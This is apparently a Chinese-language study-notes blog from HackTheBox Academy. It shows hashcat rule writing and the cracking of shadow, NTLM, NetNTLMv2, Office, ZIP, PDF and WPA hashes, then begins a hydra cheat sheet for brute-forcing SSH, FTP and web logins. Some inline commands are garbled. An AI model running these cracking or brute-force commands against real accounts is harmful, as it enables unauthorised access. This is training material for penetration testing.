可以使用函数创建规则，这些函数将单词作为输入并输出其修改后的版本。下表描述了一些与JtR以及Hashcat兼容的函数。</p><table><thead><tr><th><strong>Function</strong></th><th><strong>Description</strong></th><th><strong>Input</strong></th><th><strong>Output</strong></th></tr></thead><tbody><tr><td>l</td><td>Convert all letters to lowercase</td><td>InlaneFreight2020</td><td>inlanefreight2020</td></tr><tr><td>u</td><td>Convert all letters to uppercase</td><td>InlaneFreight2020</td><td>INLANEFREIGHT2020</td></tr><tr><td>c &#x2F; C</td><td>capitalize &#x2F; lowercase first letter and invert the rest</td><td>inlaneFreight2020 &#x2F; Inlanefreight2020</td><td>Inlanefreight2020 &#x2F; iNLANEFREIGHT2020</td></tr><tr><td>t &#x2F; TN</td><td>Toggle case : whole word &#x2F; at position N</td><td>InlaneFreight2020</td><td>iNLANEfREIGHT2020</td></tr><tr><td>d &#x2F; q &#x2F; zN &#x2F; ZN</td><td>Duplicate word &#x2F; all characters &#x2F; first character &#x2F; last character</td><td>InlaneFreight2020</td><td>InlaneFreight2020InlaneFreight2020 &#x2F; IInnllaanneeFFrreeiigghhtt22002200 &#x2F; IInlaneFreight2020 &#x2F; InlaneFreight20200</td></tr><tr><td>{ &#x2F; }</td><td>Rotate word left &#x2F; right</td><td>InlaneFreight2020</td><td>nlaneFreight2020I &#x2F; 0InlaneFreight202</td></tr><tr><td>^X &#x2F; $X</td><td>Prepend &#x2F; Append character X</td><td>InlaneFreight2020 (^! &#x2F; $! )</td><td>!InlaneFreight2020 &#x2F; InlaneFreight2020!</td></tr><tr><td>r</td><td>Reverse</td><td>InlaneFreight2020</td><td>0202thgierFenalnI</td></tr></tbody></table><p>函数的完整列表可以在这里找到 <a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack#implemented_compatible_functions">here</a>。有时，输入单词列表包含与我们的目标规范不匹配的单词。例如，公司的密码策略可能不允许用户设置长度小于7个字符的密码。在这种情况下，可以使用拒绝规则来阻止对此类单词的处理。 长度小于N的单词可以用&gt;N拒绝，而长度大于N的单词则可以用&lt;N拒绝。拒绝规则的列表可以在这里找到<a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack#rules_used_to_reject_plains">here</a>。</p><blockquote><p> 注意：拒绝规则只适用于hashcat遗留版本，或者在hashcat中使用-j或-k时使用。它们将不能作为常规规则（在规则文件中）与Hashcat一起工作。</p></blockquote><p>通常的用户行为表明，他们倾向于用类似的数字替换字母，比如“o”可以用“0”替换，或者“i”可以用”1“替换。这通常被称为L33语音，非常有效。公司密码通常以年份为前缀或附加年份。让我们创建一个规则来生成这样的单词。</p><h4 id="Create-a-Rule-File"><a href="#Create-a-Rule-File" class="headerlink" title="Create a Rule File"></a>Create a Rule File</h4><pre><code class="shell-session">Tanin@htb[/htb]$ echo &#39;c so0 si1 se3 ss5 sa@ $2 $0 $1 $9&#39; &gt; rule.txt</code></pre><p>第一个字母的单词用c函数大写。然后规则使用替换函数s将o替换为0，将i替换为1，将e替换为3，将a替换为@。最后，2019年被附加到它后面。将规则复制到一个文件中，以便我们可以调试它。</p><p>可以使用“-r”标志来指定规则，然后使用单词列表来调试规则。</p><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -r rule.txt test.txt --stdoutP@55w0rd_1lfr31ght2019</code></pre><p>我们能够用我们的自定义规则和rockyou.txt破解哈希。Hashcat支持重复使用-r标志来使用多规则。默认情况下，Hashcat使用各种规则进行。它们可以在规则文件夹中找到。</p><h4 id="Hashcat-Default-Rules"><a href="#Hashcat-Default-Rules" class="headerlink" title="Hashcat - Default Rules"></a>Hashcat - Default Rules</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ls -l /usr/share/hashcat/rules/total 2576-rw-r--r-- 1 root root    933 Jun 19 06:20 best64.rule-rw-r--r-- 1 root root    633 Jun 19 06:20 combinator.rule-rw-r--r-- 1 root root 200188 Jun 19 06:20 d3ad0ne.rule-rw-r--r-- 1 root root 788063 Jun 19 06:20 dive.rule-rw-r--r-- 1 root root 483425 Jun 19 06:20 generated2.rule-rw-r--r-- 1 root root  78068 Jun 19 06:20 generated.ruledrwxr-xr-x 1 root root   2804 Jul  9 21:01 hybrid-rw-r--r-- 1 root root 309439 Jun 19 06:20 Incisive-leetspeak.rule-rw-r--r-- 1 root root  35280 Jun 19 06:20 InsidePro-HashManager.rule-rw-r--r-- 1 root root  19478 Jun 19 06:20 InsidePro-PasswordsPro.rule-rw-r--r-- 1 root root    298 Jun 19 06:20 leetspeak.rule-rw-r--r-- 1 root root   1280 Jun 19 06:20 oscommerce.rule-rw-r--r-- 1 root root 301161 Jun 19 06:20 rockyou-30000.rule-rw-r--r-- 1 root root   1563 Jun 19 06:20 specific.rule-rw-r--r-- 1 root root  64068 Jun 19 06:20 T0XlC-insert_00-99_1950-2050_toprules_0_F.rule-rw-r--r-- 1 root root   2027 Jun 19 06:20 T0XlC-insert_space_and_special_0_F.rule-rw-r--r-- 1 root root  34437 Jun 19 06:20 T0XlC-insert_top_100_passwords_1_G.rule-rw-r--r-- 1 root root  34813 Jun 19 06:20 T0XlC.rule-rw-r--r-- 1 root root 104203 Jun 19 06:20 T0XlCv1.rule-rw-r--r-- 1 root root     45 Jun 19 06:20 toggles1.rule-rw-r--r-- 1 root root    570 Jun 19 06:20 toggles2.rule-rw-r--r-- 1 root root   3755 Jun 19 06:20 toggles3.rule-rw-r--r-- 1 root root  16040 Jun 19 06:20 toggles4.rule-rw-r--r-- 1 root root  49073 Jun 19 06:20 toggles5.rule-rw-r--r-- 1 root root  55346 Jun 19 06:20 unix-ninja-leetspeak.rule</code></pre><p>还有各种公开的规则，如<a href="https://github.com/NSAKEY/nsa-rules">nsa-rules</a>、 <a href="https://github.com/praetorian-code/Hob0Rules">Hob0Rules</a>和《 <a href="https://www.hacklikeapornstar.com/new-release-hack-like-legend/">How to Hack Like a Legend</a>》一书中的 <a href="https://github.com/sparcflow/HackLikeALegend/blob/master/old/chap3/corporate.rule">corporate.rule</a>。这些是精心策划的规则集，通常针对常见的公司Windows密码策略，或者基于统计数据和可能的行业密码模式。</p><h2 id="practice-4"><a href="#practice-4" class="headerlink" title="practice"></a>practice</h2><blockquote><p>使用生成自定义规则所教的技术破解以下SHA1哈希：46244749d1e8fb99c37ad4f14fccb601ed4ae283。修改本节开头的示例规则，将2020附加到每次密码尝试的末尾。</p></blockquote><pre><code>┌──(root㉿Tanin)-[/home/tanin/test]└─# echo &#39;c so0 si1 se3 ss5 sa@ $2 $0 $2 $0&#39; &gt; rule.txt                                                                                                         ┌──(root㉿Tanin)-[/home/tanin/test]└─# hashcat -a 0 -m 100 46244749d1e8fb99c37ad4f14fccb601ed4ae283 /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -r  rule.txt     &lt;snip&gt;46244749d1e8fb99c37ad4f14fccb601ed4ae283:R@c3c@r2020  </code></pre><h1 id="Cracking-Common-Hashes"><a href="#Cracking-Common-Hashes" class="headerlink" title="Cracking Common Hashes"></a>Cracking Common Hashes</h1><h2 id="Example-1-Database-Dumps"><a href="#Example-1-Database-Dumps" class="headerlink" title="Example 1 - Database Dumps"></a>Example 1 - Database Dumps</h2><p>MD5、SHA1和bcrypt散列经常出现在数据库转储中。这些散列可以在成功的SQL注入攻击后检索，也可以在公开的密码数据泄露数据库转储中找到。MD5和SHA1通常比bcrypt更容易破解，bcrypt可能应用了许多轮Blowfish算法。 让我们破解一些SHA1散列。请选择以下列表：</p><h4 id="SHA1-Hashes-List"><a href="#SHA1-Hashes-List" class="headerlink" title="SHA1 Hashes List"></a>SHA1 Hashes List</h4><pre><code class="shell-session">winter!baseball1waterslidesummertimebaconandeggsbeach1234sunshine1welcome1password123</code></pre><p>我们可以快速创建每个单词的SHA1：</p><pre><code class="shell-session">Tanin@htb[/htb]$ for i in $(cat words); do echo -n $i | sha1sum | tr -d &#39; -&#39;;donefa3c9ecfc251824df74026b4f40e4b373fd4fc46e6852777c0260493de41fb43918ab07bbb3a659c0c3feaa16f73493f998970e22b2a02cb9b546768b863c49eada14e3a8816220a7ab7054c28693664b0feedd70a346f7f75086026169825996d7196f9f47f832cba913ec305b07958b41babe2e0ad043708b314f0e1e2c41ec92c3735910658e5a82c6ba7e35bece6c5e6e0e86ca51d0440e92282a9d6ac8acbfdac6008f9cab4083784cbd1874f76618d2a97</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -m 100 SHA1_hashes /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt</code></pre><h2 id="Example-2-Linux-Shadow-File"><a href="#Example-2-Linux-Shadow-File" class="headerlink" title="Example 2 - Linux Shadow File"></a>Example 2 - Linux Shadow File</h2><p>Sha512crypt散列通常出现在Linux系统上的&#x2F;etc&#x2F;shadow文件中。该文件包含所有帐户的密码哈希，并为其分配了登录外壳。在渗透测试期间，我们可能会通过web应用程序攻击或成功利用易受攻击的服务来访问Linux系统。我们可能会利用已经在最高特权根帐户的上下文中运行的服务进行攻击，并成功执行权限提升攻击并访问&#x2F;etc&#x2F;shadow文件。密码重复使用现象普遍。破解的密码可能会让我们访问其他服务器、网络设备，甚至被用作目标Active Directory环境的立足点。 让我们来看看标准Ubuntu安装的散列。以下哈希对应的明文为“password123”。 Ubuntu Linux中的根密码</p><h4 id="Root-Password-in-Ubuntu-Linux"><a href="#Root-Password-in-Ubuntu-Linux" class="headerlink" title="Root Password in Ubuntu Linux"></a>Root Password in Ubuntu Linux</h4><pre><code class="shell-session">root:$6$tOA0cyybhb/Hr7DN$htr2vffCWiPGnyFOicJiXJVMbk1muPORR.eRGYfBYUnNPUjWABGPFiphjIjJC5xPfFUASIbVKDAHS3vTW1qU.1:18285:0:99999:7:::</code></pre><p>哈希包含九个用冒号分隔的字段。前两个字段包含用户名及其加密的哈希。其余字段包含各种属性，如密码创建时间、上次更改时间和到期时间。 谈到散列，我们已经知道它包含三个由“$”分隔的字段。值“6”代表SHA-512散列算法；接下来的16个字符表示salt，而其余的是实际的hash。 让我们使用Hashcat破解这个散列。</p><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -m 1800 nix_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txthashcat (v6.1.1) starting...&lt;SNIP&gt;$6$tOA0cyybhb/Hr7DN$htr2vffCWiPGnyFOicJiXJVMbk1muPORR.eRGYfBYUnNPUjWABGPFiphjIjJC5xPfFUASIbVKDAHS3vTW1qU.1:password123 </code></pre><h2 id="Example-3-Common-Active-Directory-Password-Hash-Types"><a href="#Example-3-Common-Active-Directory-Password-Hash-Types" class="headerlink" title="Example 3 - Common Active Directory Password Hash Types"></a>Example 3 - Common Active Directory Password Hash Types</h2><p>凭据盗窃和密码重复使用是针对使用Active Directory管理其环境的组织进行评估时普遍采用的策略。通过传递哈希或SMB中继攻击，通常可以获得明文中的凭据或重复使用密码哈希来进一步访问。尽管如此，一些技术还是会导致密码哈希，必须离线破解才能进一步访问。一些示例包括通过中间人（MITM）攻击获得的NetNTLMv1或NetNTLMv2，通过Kerberoasting攻击获得的Kerberos 5 TGS-REP哈希，或通过使用Mimikatz工具从内存转储凭据或从Windows机器的本地SAM数据库获得的NTLM哈希。</p><h4 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h4><p>一个示例是为具有服务器远程桌面（RDP）访问权限但不是本地管理员的用户检索NTLM密码哈希，因此NTLM哈希不能用于通过哈希攻击来获得访问权限。在这种情况下，明文密码对于通过RDP连接到服务器并在网络中执行进一步枚举或寻找本地权限提升向量来进一步访问是必要的。 让我们走过一个例子。我们可以使用3行Python快速生成密码“Password01”的NTLM哈希：</p><h4 id="Python3-Hashlib"><a href="#Python3-Hashlib" class="headerlink" title="Python3 - Hashlib"></a>Python3 - Hashlib</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python3Python 3.8.3 (default, May 14 2020, 11:03:12) [GCC 9.3.0] on linuxType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; import hashlib,binascii&gt;&gt;&gt; hash = hashlib.new(&#39;md4&#39;, &quot;Password01&quot;.encode(&#39;utf-16le&#39;)).digest()&gt;&gt;&gt; print (binascii.hexlify(hash))b&#39;7100a909c7ff05b266af3c42ec058c33&#39;</code></pre><h4 id="Hashcat-Cracking-NTLM-Hashes"><a href="#Hashcat-Cracking-NTLM-Hashes" class="headerlink" title="Hashcat - Cracking NTLM Hashes"></a>Hashcat - Cracking NTLM Hashes</h4><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -a 0 -m 1000 ntlm_example /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt</code></pre><h4 id="NetNTLMv2"><a href="#NetNTLMv2" class="headerlink" title="NetNTLMv2"></a>NetNTLMv2</h4><p>在渗透测试期间，通常会运行<a href="https://github.com/lgandx/Responder">Responder</a> 等工具来执行MITM攻击，试图“窃取”凭据。其他模块将深入介绍这些类型的攻击。在繁忙的公司网络中，使用此方法检索许多NetNTLMv2密码哈希是很常见的。这些通常可以被破解和利用，以在Active Directory环境中建立立足点，有时甚至可以获得对许多或所有系统的完全管理访问权限，这取决于授予与密码哈希相关联的用户帐户的权限。请考虑以下在评估开始时使用响应程序检索的密码哈希：</p><h4 id="Responder-NTLMv2"><a href="#Responder-NTLMv2" class="headerlink" title="Responder - NTLMv2"></a>Responder - NTLMv2</h4><pre><code class="shell-session">sqladmin::INLANEFREIGHT:f54d6f198a7a47d4:7FECABAE13101DAAA20F1B09F7F7A4EA:0101000000000000C0653150DE09D20126F3F71DF13C1FD8000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000003000001A67637962F2B7BF297745E6074934196D5F4371B6BA3E796F2997306FD4C1C00A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003100390035002E00310037003000000000000000000000000000</code></pre><pre><code class="shell-session">hashcat -a 0 -m 5600 inlanefreight_ntlmv2 /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt</code></pre><h1 id="Cracking-Miscellaneous-Files-amp-Hashes"><a href="#Cracking-Miscellaneous-Files-amp-Hashes" class="headerlink" title="Cracking Miscellaneous Files &amp; Hashes"></a>Cracking Miscellaneous Files &amp; Hashes</h1><p>在渗透测试和其他评估过程中，通常会遇到受密码保护的文档，如Microsoft Word和Excel文档、OneNote笔记本、KeePass数据库文件、SSH私钥密码、PDF文件、zip（和其他存档格式）文件等。这些散列中的大多数可以通过Hashcat运行，以尝试破解散列。</p><h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><p>有各种工具可以帮助我们以Hashcat可以理解的格式从这些文件中提取密码哈希。密码破解工具JohnTheRipper附带了许多用C编写的工具，这些工具在安装JohnTherippler或从其源代码编译时可用。它们可以在这里 <a href="https://github.com/magnumripper/JohnTheRipper/tree/bleeding-jumbo/src">here</a>查看。要使用这些工具，我们需要对它们进行编译。</p><h4 id="JohnTheRipper-Installation"><a href="#JohnTheRipper-Installation" class="headerlink" title="JohnTheRipper - Installation"></a>JohnTheRipper - Installation</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo git clone https://github.com/magnumripper/JohnTheRipper.gitTanin@htb[/htb]$ cd JohnTheRipper/srcTanin@htb[/htb]$ sudo ./configure &amp;&amp; make</code></pre><h2 id="Example-1-Cracking-Password-Protected-Microsoft-Office-Documents"><a href="#Example-1-Cracking-Password-Protected-Microsoft-Office-Documents" class="headerlink" title="Example 1 - Cracking Password Protected Microsoft Office Documents"></a>Example 1 - Cracking Password Protected Microsoft Office Documents</h2><p>Hashcat可用于尝试使用office2john.py工具破解从某些Microsoft Office文档中提取的密码哈希。 Hashcat为Microsoft Office文档支持以下哈希模式：</p><table><thead><tr><th><strong>Mode</strong></th><th><strong>Target</strong></th></tr></thead><tbody><tr><td><code>9400</code></td><td>MS Office 2007</td></tr><tr><td><code>9500</code></td><td>MS Office 2010</td></tr><tr><td><code>9600</code></td><td>MS Office 2013</td></tr></tbody></table><p>对于2003年以前的MS Office文档，还有几种“$oldoffice$”哈希模式。让我们取一个受密码“pa55word”保护的Word文档。我们可以首先使用office2john.py从文档中提取哈希。</p><h4 id="Extract-Hash"><a href="#Extract-Hash" class="headerlink" title="Extract Hash"></a>Extract Hash</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python office2john.py hashcat_Word_example.docx hashcat_Word_example.docx:$office$*2013*100000*256*16*6e059661c3ed733f5730eaabb41da13a*aa38e007ee01c07e4fe95495934cf68f*2f1e2e9bf1f0b320172cd667e02ad6be1718585b6594691907b58191a6</code></pre><p>然后，我们可以使用9600模式通过Hashcat运行哈希，并使用rockyou.txt单词列表对其进行简短的处理。</p><h4 id="Hashcat-Cracking-MS-Office-Passwords"><a href="#Hashcat-Cracking-MS-Office-Passwords" class="headerlink" title="Hashcat - Cracking MS Office Passwords"></a>Hashcat - Cracking MS Office Passwords</h4><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -m 9600 office_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt</code></pre><h2 id="Example-2-Cracking-Password-Protected-Zip-Files"><a href="#Example-2-Cracking-Password-Protected-Zip-Files" class="headerlink" title="Example 2 - Cracking Password Protected Zip Files"></a>Example 2 - Cracking Password Protected Zip Files</h2><p>在评估过程中，我们可能会发现一个有趣的zip文件，但它是受密码保护的！我们可以使用zip2john工具的编译版本来提取这些散列。Hashcat支持多种压缩文件格式，例如：</p><table><thead><tr><th><strong>Mode</strong></th><th><strong>Target</strong></th></tr></thead><tbody><tr><td><code>11600</code></td><td>7-Zip</td></tr><tr><td><code>13600</code></td><td>WinZip</td></tr><tr><td><code>17200</code></td><td>PKZIP (Compressed)</td></tr><tr><td><code>17210</code></td><td>PKZIP (Uncompressed)</td></tr><tr><td><code>17220</code></td><td>PKZIP (Compressed Multi-File)</td></tr><tr><td><code>17225</code></td><td>PKZIP (Mixed Multi-File)</td></tr><tr><td><code>17230</code></td><td>PKZIP (Compressed Multi-File Checksum-Only)</td></tr><tr><td><code>23001</code></td><td>SecureZIP AES-128</td></tr><tr><td><code>23002</code></td><td>SecureZIP AES-192</td></tr><tr><td><code>23003</code></td><td>SecureZIP AES-256</td></tr></tbody></table><h4 id="Set-Password-for-a-ZIP-File"><a href="#Set-Password-for-a-ZIP-File" class="headerlink" title="Set Password for a ZIP File"></a>Set Password for a ZIP File</h4><pre><code class="shell-session">Tanin@htb[/htb]$ zip --password zippyzippy blueprints.zip dummy.pdf adding: dummy.pdf (deflated 7%)</code></pre><p>然后，我们可以使用zip2john的编译版本以可以通过Hashcat运行的格式提取哈希。</p><h4 id="Extract-Hash-1"><a href="#Extract-Hash-1" class="headerlink" title="Extract Hash"></a>Extract Hash</h4><pre><code class="shell-session">Tanin@htb[/htb]$ zip2john ~/Desktop/HTB/Academy/Cracking\ with\ Hashcat/blueprints.zip </code></pre><p>我们可以从该散列中看出，这是模式17200-PKZIP（压缩）。要通过Hashcat运行此操作，我们需要从$pkzip2$1开始并以&#x2F;pkzip2$结束的整个哈希。有了散列，让我们使用直接字典攻击的Hashcat来运行它。</p><h4 id="Hashcat-Cracking-ZIP-Files"><a href="#Hashcat-Cracking-ZIP-Files" class="headerlink" title="Hashcat - Cracking ZIP Files"></a>Hashcat - Cracking ZIP Files</h4><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -a 0 -m 17200 pdf_hash_to_crack /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt</code></pre><h2 id="Example-4-Cracking-Protected-PDF-Files"><a href="#Example-4-Cracking-Protected-PDF-Files" class="headerlink" title="Example 4 - Cracking Protected PDF Files"></a>Example 4 - Cracking Protected PDF Files</h2><p>本节的最后一个示例主要介绍受密码保护的PDF文档。与其他文件类型一样，如果我们获得访问权限，我们经常会在工作站、文件共享甚至用户的电子邮件收件箱中遇到受密码保护的PDF（仔细阅读用户的电子邮件以获取敏感信息属于您的参与范围）。 我们可以使用pdf2john.py提取密码短语的哈希。下面的命令将把哈希提取成Hashcat可以使用的格式。</p><table><thead><tr><th><strong>Mode</strong></th><th><strong>Target</strong></th></tr></thead><tbody><tr><td><code>10400</code></td><td>PDF 1.1 - 1.3 (Acrobat 2 - 4)</td></tr><tr><td><code>10410</code></td><td>PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1</td></tr><tr><td><code>10420</code></td><td>PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2</td></tr><tr><td><code>10500</code></td><td>PDF 1.4 - 1.6 (Acrobat 5 - 8)</td></tr><tr><td><code>10600</code></td><td>PDF 1.7 Level 3 (Acrobat 9)</td></tr><tr><td><code>10700</code></td><td>PDF 1.7 Level 8 (Acrobat 10 - 11)</td></tr></tbody></table><h1 id="Cracking-Wireless-WPA-x2F-WPA2-Handshakes-with-Hashcat"><a href="#Cracking-Wireless-WPA-x2F-WPA2-Handshakes-with-Hashcat" class="headerlink" title="Cracking Wireless (WPA&#x2F;WPA2) Handshakes with Hashcat"></a>Cracking Wireless (WPA&#x2F;WPA2) Handshakes with Hashcat</h1><p>另一个例子是无线安全评估。客户经常要求进行无线评估，作为内部渗透测试参与的一部分。虽然无线并不总是最令人兴奋的，但如果您能够捕获WPA&#x2F;WPA2握手，它可能会变得有趣。无线网络通常没有与公司的公司网络适当地划分，并且对无线网络的成功认证可能会授予对内部公司网络的完全访问。 Hashcat可用于成功破解MIC（4次握手）和PMKID（第一次数据包&#x2F;握手）。</p><h2 id="Cracking-MIC"><a href="#Cracking-MIC" class="headerlink" title="Cracking MIC"></a>Cracking MIC</h2><p>当连接到无线网络的客户端和无线接入点（AP）进行通信时，它们必须确保它们都具有&#x2F;知道无线网络密钥，但没有在网络上传输密钥。密钥由AP进行加密和验证。 要执行这种类型的离线破解攻击，我们需要通过发送去身份验证帧来捕获有效的4路握手，以迫使客户端（用户）与AP断开连接。当客户端重新进行身份验证（通常是自动的）时，攻击者可以在不知情的情况下尝试探查WPA 4路握手。此握手是在客户端和相关联的AP之间的身份验证过程中交换的密钥的集合。注意：无线攻击超出了本模块的范围，但将在其他模块中涵盖。 这些密钥用于生成一个称为消息完整性检查（MIC）的公共密钥，AP使用该密钥来验证每个数据包是否未被泄露并以其原始状态接收。 下图显示了4次握手：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307131112254.png" alt="image"></p><p>一旦我们使用 <a href="https://www.aircrack-ng.org/doku.php?id=airodump-ng">airodump-ng</a>等工具成功捕获了4次握手，我们就需要将其转换为可以提供给Hashcat进行破解的格式。所需的格式是hccapx，Hashcat托管一个在线服务以转换为这种格式（不建议用于实际的客户端数据，但适用于实验室&#x2F;实践练习）：<a href="https://hashcat.net/cap2hashcat">cap2hashcat online</a>。为了离线执行转换，我们需要来自GitHub的hashcat utils repo。 我们可以克隆repo并编译该工具，如下所示：</p><h4 id="Hashcat-Utils-Installation"><a href="#Hashcat-Utils-Installation" class="headerlink" title="Hashcat-Utils - Installation"></a>Hashcat-Utils - Installation</h4><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/hashcat/hashcat-utils.gitTanin@htb[/htb]$ cd hashcat-utils/srcTanin@htb[/htb]$ make</code></pre><h4 id="Cap2hccapx-Syntax"><a href="#Cap2hccapx-Syntax" class="headerlink" title="Cap2hccapx - Syntax"></a>Cap2hccapx - Syntax</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ./cap2hccapx.bin </code></pre><h4 id="Cap2hccapx-Convert-To-Crackable-File"><a href="#Cap2hccapx-Convert-To-Crackable-File" class="headerlink" title="Cap2hccapx - Convert To Crackable File"></a>Cap2hccapx - Convert To Crackable File</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ./cap2hccapx.bin corp_capture1-01.cap mic_to_crack.hccapx</code></pre><p>有了这个文件，我们就可以使用本模块前面讨论的一种或多种技术进行破解。对于这个例子，我们将执行一个直接的字典攻击来破解WPA握手。为了尝试破解这个散列，我们将使用模式22000，因为之前的模式2500已经被弃用。我们破解这个散列的命令看起来像<code>hashcat-a 0-m 22000 mic_to_rack.hcapx/opt/utille/SecLists/Passwords/Leaked Databases/rockyo.txt</code>。</p><h2 id="Cracking-PMKID"><a href="#Cracking-PMKID" class="headerlink" title="Cracking PMKID"></a>Cracking PMKID</h2><p>这种攻击可以针对使用WPA&#x2F;WPA2-PSK（预共享密钥）的无线网络执行，并允许我们通过直接攻击AP来获得目标无线网络正在使用的PSK。该攻击不需要对目标AP的任何用户进行身份验证（deauth）。PMK与MIC（4路握手）攻击中的相同，但通常可以更快地获得，并且不会中断任何用户。 成对主密钥标识符（PMKID）是AP的唯一标识符，用于跟踪客户端使用的成对主密钥（PMK）。PMKID位于4次握手的第一个分组中，并且由于它不需要捕获整个4次握手，因此可以更容易地获得。PMKID是用HMAC-SHA1计算的，PMK（无线网络密码）用作密钥，字符串“PMK名称”，接入点的MAC地址和站点的MAC地址。以下是PMKID计算的可视化表示：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307131115060.png" alt="image"></p><p>要执行PMKID破解，我们需要获得PMKID哈希。第一步是使用诸如hcxtools中的hcxpcaptol之类的工具从capture（.cap）文件中提取它。我们可以使用apt:sudo-apt-install-hcxtools在Parrot上安装hcxtools。</p><p>注意：该工具已被hcxpcapngtool取代，我们可以直接从 <a href="https://github.com/ZerBea/hcxtools">hcxtools GitHub repo</a>编译和安装该工具。</p><h4 id="Extract-PMKID-Using-Hcxpcaptool"><a href="#Extract-PMKID-Using-Hcxpcaptool" class="headerlink" title="Extract PMKID - Using Hcxpcaptool"></a>Extract PMKID - Using Hcxpcaptool</h4><pre><code class="shell-session">Tanin@htb[/htb]$ hcxpcaptool -z pmkidhash_corp cracking_pmkid.cap </code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ hcxpcaptool -z pmkidhash_corp cracking_pmkid.cap </code></pre><p>我们将再次执行直接字典攻击，试图破解WPA握手。为了尝试破解此哈希，我们将再次使用模式22000，因为之前的模式16800也已被取消创建。在这里，我们的命令的格式是<code>hashcat-a 0-m 22000 pmkidhash_corp/opt/helper/SecLists/Passwords/Leaked Databases/rockyou.txt</code>。</p><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -a 0 -m 22000 pmkidhash_corp /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt</code></pre><p>或者，我们可以将hcxtools repo克隆到我们自己的VM中，编译和安装，然后使用工具hcxpcapngtool执行类似的步骤。</p><h4 id="Hcxtools-Installation"><a href="#Hcxtools-Installation" class="headerlink" title="Hcxtools - Installation"></a>Hcxtools - Installation</h4><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/ZerBea/hcxtools.gitTanin@htb[/htb]$ cd hcxtoolsTanin@htb[/htb]$ make &amp;&amp; make install</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ hcxpcapngtool cracking_pmkid.cap -o pmkidhash_corp2</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>brute forcing-hydra</title>
      <link href="/2023/07/10/brute-forcing/"/>
      <url>/2023/07/10/brute-forcing/</url>
      
        <content type="html"><![CDATA[<p>暴力攻击是一种试图通过自动探测来猜测密码或密钥的方法。暴力攻击的一个例子是密码破解。密码通常不会以明文形式存储在系统中，而是作为哈希值存储。 </p><span id="more"></span><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>hydra -h</code></td><td>九头蛇帮助</td></tr><tr><td><code>hydra -C wordlist.txt SERVER_IP -s PORT http-get /</code></td><td>基本身份验证暴力破解 - 组合词表</td></tr><tr><td><code>hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /</code></td><td>基本身份验证暴力破解 - 用户&#x2F;传递单词列表</td></tr><tr><td><code>hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name=&#39;login&#39;&quot;</code></td><td>登录表单暴力破解 - 静态用户，传递单词列表</td></tr><tr><td><code>hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4</code></td><td>SSH 暴力破解 - 用户&#x2F;传递词表</td></tr><tr><td><code>hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1</code></td><td>FTP 暴力破解 - 静态用户，传递单词列表</td></tr></tbody></table><h1 id="单词列表"><a href="#单词列表" class="headerlink" title="单词列表"></a>单词列表</h1><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt</code></td><td>默认密码单词列表</td></tr><tr><td><code>/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt</code></td><td>常用密码单词表</td></tr><tr><td><code>/opt/useful/SecLists/Usernames/Names/names.txt</code></td><td>常用名称词表</td></tr></tbody></table><h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>cupp -i</code></td><td>创建自定义密码单词表</td></tr><tr><td><code>sed -ri &#39;/^.&#123;,7&#125;$/d&#39; william.txt</code></td><td>删除短于 8 的密码</td></tr><tr><td><code>sed -ri &#39;/[!-/:-@\[-</code>{-~]+&#x2F;!d’ william.txt&#96;</td><td>删除没有特殊字符的密码</td></tr><tr><td><code>sed -ri &#39;/[0-9]+/!d&#39; 